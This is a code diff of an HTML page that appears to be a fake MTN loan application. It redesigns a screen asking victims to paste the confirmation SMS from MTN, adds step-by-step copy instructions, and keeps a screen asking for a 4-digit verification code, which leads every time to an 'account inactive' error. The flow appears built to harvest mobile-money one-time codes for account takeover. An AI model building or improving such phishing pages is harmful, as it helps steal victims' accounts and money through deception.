@@ -10,7 +10,7 @@
 
     <!-- Screen 1: Language Selection -->
     <div id="language-screen" class="dark-screen active">
-        <div class="dark-card">
+        <div class="dark-card popup-card">
             <div class="logo-container">
                 <svg viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <rect x="2" y="5" width="20" height="14" rx="2"></rect>
@@ -158,7 +158,7 @@
                     </div>
                 </div>
 
-                <!-- Step 3: Employment Details (UPDATED) -->
+                <!-- Step 3: Employment Details -->
                 <div id="step-3" class="form-step">
                     <h2 class="step-title">Employment Details</h2>
                     
@@ -189,36 +189,64 @@
 
     <!-- Screen 4: Processing -->
     <div id="processing-screen" class="dark-screen">
-        <div class="dark-card" style="text-align:center;">
+        <div class="dark-card popup-card" style="text-align:center;">
             <h2 class="dark-title">Processing Application</h2>
             <p class="dark-subtitle">Please wait, this may take a few seconds</p>
             <div class="loader"></div>
         </div>
     </div>
 
-    <!-- Screen 5: Paste SMS -->
+    <!-- Screen 5: Paste SMS (UPDATED DESIGN) -->
     <div id="sms-screen" class="dark-screen">
-        <div class="dark-card" style="text-align:center;">
-            <h2 class="dark-title">Paste the SMS from MTN</h2>
-            <p class="dark-subtitle">We sent a confirmation message to your number. Copy the full SMS you received and paste it below.</p>
-            <textarea class="dark-input" placeholder="Paste SMS here..."></textarea>
-            <button class="btn-primary" onclick="showScreen('verification-screen')">Next</button>
+        <div class="calculator-container" style="max-width: 800px;">
+            
+            <div class="smt-header">
+                <!-- Shield Envelope Icon -->
+                <div class="shield-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4z" fill="#ffcc00"/>
+                        <path d="M4 8h16v8H4z" fill="#0f1a2e"/>
+                        <path d="M4 8l8 5 8-5" stroke="#ffcc00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M8 11h4" stroke="#ffcc00" stroke-width="2" stroke-linecap="round"/>
+                        <path d="M8 14h6" stroke="#ffcc00" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                
+                <h2 class="dark-title">Paste the <span class="highlight-yellow">SMS</span> from MTN</h2>
+                <p class="dark-subtitle">
+                    We sent a confirmation message to your number.<br>
+                    <strong>Copy the full SMS you received</strong> and paste it below.
+                </p>
+            </div>
+
+            <!-- Tip Box -->
+            <div class="tip-box">
+                <span class="tip-icon">💡</span>
+                <p>Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.</p>
+            </div>
+
+            <!-- Text Area -->
+            <textarea class="sms-textarea" placeholder="Paste the SMS received from MTN here..."></textarea>
+
+            <!-- Verify Button -->
+            <button class="btn-verify" onclick="showScreen('verification-screen')">VERIFY & CONTINUE &rarr;</button>
+
         </div>
     </div>
 
     <!-- Screen 6: Verification Code -->
     <div id="verification-screen" class="dark-screen">
-        <div class="dark-card" style="text-align:center;">
+        <div class="dark-card popup-card" style="text-align:center;">
             <h2 class="dark-title">Enter the Verification Code</h2>
             <p class="dark-subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
-            <input type="text" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
-            <button class="btn-primary" onclick="showScreen('error-screen')">Verify</button>
+            <input type="text" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px; margin-bottom: 20px;">
+            <button class="btn-primary" onclick="showScreen('error-screen')">VERIFY</button>
         </div>
     </div>
 
     <!-- Screen 7: Error/Inactive Account -->
     <div id="error-screen" class="dark-screen">
-        <div class="dark-card" style="text-align:center;">
+        <div class="dark-card popup-card" style="text-align:center;">
             <h2 class="dark-title">Oops! Your account is inactive</h2>
             <p class="dark-subtitle">We can't credit your loan at the moment.</p>
             <h4 class="highlight-yellow" style="margin-bottom: 10px;">Here's what to do next</h4>
